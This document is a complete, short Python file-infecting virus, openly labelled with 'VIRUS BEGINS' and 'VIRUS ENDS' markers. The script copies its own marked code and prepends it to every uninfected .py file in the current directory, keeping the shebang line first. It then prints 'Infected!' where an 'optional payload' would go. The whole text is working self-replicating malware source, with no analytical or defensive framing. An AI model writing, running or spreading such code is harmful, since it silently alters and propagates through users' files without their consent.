#!/usr/bin/env python

#### VIRUS BEGINS ####
import sys,glob,re

# Get a copy of Virus
vCode=[]
fh=open(sys.argv[0],"r")
lines=fh.readlines()

fh.close()

inVirus=False

for line in lines:
    if re.search('^#### VIRUS BEGINS ####',line):inVirus=True
    if inVirus:vCode.append(line)
    if re.search('^#### VIRUS ENDS ####',line):break

# Find Potential Victims
progs=glob.glob('*.py')

# Check and Infect
for prog in progs:
    fh=open(prog,"r")
    pCode=fh.readlines()
    fh.close()

    infected=False

    for line in pCode:
        if '#### VIRUS BEGINS ####' in line:
            infected=True
            break

    if not infected:
        newCode=[]
        if '#!' in pCode[0]:newCode.append(pCode.pop(0))

        newCode.extend(vCode)
        newCode.extend(pCode)

        fh=open(prog,'w')
        fh.writelines(newCode)
        fh.close()

# Optional Payload

print("Infected!")